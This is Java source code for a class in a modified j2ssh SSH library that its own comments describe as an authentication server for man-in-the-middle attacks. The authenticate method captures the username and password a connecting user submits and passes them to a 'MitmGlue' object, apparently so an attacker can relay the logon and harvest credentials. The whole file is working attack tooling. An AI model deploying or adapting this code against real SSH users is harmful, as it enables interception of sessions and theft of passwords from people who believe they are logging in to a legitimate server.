/*
 * Created on Mar 2, 2003
 *
 */
package com.sshtools.j2ssh.authentication;

import java.io.IOException;
import java.util.Map;

import org.apache.log4j.Logger;

import com.sshtools.j2ssh.MitmGlue;
import com.sshtools.j2ssh.MitmServer;
import com.sshtools.j2ssh.configuration.ConfigurationLoader;
import com.sshtools.j2ssh.configuration.PlatformConfiguration;
import com.sshtools.j2ssh.io.ByteArrayReader;
import com.sshtools.j2ssh.platform.MitmFakeAuthenticationProvider;
import com.sshtools.j2ssh.platform.NativeAuthenticationProvider;

/**
 * @author David G&uuml;mbel<br>
 * created 03 March 2003<br>
 *
 * Authentication server for use in mitm attacks. Largely based on
 * <code>SshAuthenticationServer</code>.
 */
class MitmAuthenticationServer extends SshAuthenticationServer {
	private static Logger log =
					Logger.getLogger(MitmAuthenticationServer.class);
	private MitmGlue mg;
	
	public String getMethodName() {
		return "password";
		
	}
	
	/**
	 * Constructor, logs its creation
	 *
	 */
	public MitmAuthenticationServer()	 {
		log.debug("mitm: MitmAuthenticationServer created");
	}
	
	/**
	 * Mutator for local reference to MitmGlue instance
	 * @param mg
	 */
	public void setMitmGlue (MitmGlue mg) {		
		this.mg = mg; 
		log.debug("mitm: setMigmGlue() called");
	}




	/**
	 *  Called to authenticate a users password; it requires the authentication 
	 * method to be a <code>MitmFakeAuthenticationProvider</code>, to which it passes the
	 * <code>MitmGlue</code> object reference that will then recieve username and password or 
	 * any other credentials supplied for logon.
	 *
	 *@param  msg
	 *@param  nativeSettings               A Map of native settings containing
	 *      platform specific information that could be required for
	 *      authentication
	 *@throws  TransportProtocolException  if an error occurs in the Transport
	 *      Protocol
	 *@throws  ServiceOperationException   if a critical error occurs in the
	 *      service operation
	 */
	public int authenticate(AuthenticationProtocolServer authentication,
							SshMsgUserAuthRequest msg, Map nativeSettings)
			 throws IOException {
		PlatformConfiguration platform =
				ConfigurationLoader.getPlatformConfiguration();

		if (platform == null) {
			log.info("Cannot authenticate, no platform configuration available");
			return AuthenticationProtocolState.FAILED;
		}

		log.info("Trying to get instance of authentication provider");
		NativeAuthenticationProvider authImpl =
				NativeAuthenticationProvider.getInstance();

		if (authImpl == null) {
			log.error("Cannot perfrom authentication witout native authentication provider");
			return AuthenticationProtocolState.FAILED;
		}

		ByteArrayReader bar = new ByteArrayReader(msg.getRequestData());
		bar.read();

		String password = bar.readString();
		
		/* mitm specific part */
		if (((MitmFakeAuthenticationProvider)authImpl).logonUser(getUsername(), password, nativeSettings, mg)) {
			log.info(getUsername() + " has passed password authentication");
			return AuthenticationProtocolState.COMPLETE;
		} else {
			log.info(getUsername() + " has failed password authentication");
			mg.doDisconnect(); /* ---- mitm --- */
			return AuthenticationProtocolState.FAILED;
		}
	}


}
